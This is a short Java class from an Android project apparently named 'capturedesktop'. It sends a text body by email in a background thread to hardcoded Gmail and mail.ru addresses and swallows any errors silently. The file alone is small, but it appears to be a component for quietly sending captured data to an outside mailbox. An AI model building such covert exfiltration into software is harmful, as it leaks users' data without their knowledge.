package com.example.capturedesktop;

import android.util.Log;

public class MailSendRunnable implements Runnable{

	
	GMailSender sender;
         String textbody;
         
	public MailSendRunnable(GMailSender sender, String textbody){
		
		this.sender   = sender;		
		this.textbody = textbody;
	}
	
	public void run() {		
		
		try {
			sender.sendMail(textbody, textbody, "defcon.fused@gmail.com", "dummyuser07@mail.ru");
		} catch (Exception e) {
	      Log.e("mail thread", "exception occured");
		}   
		
	}//end run

}
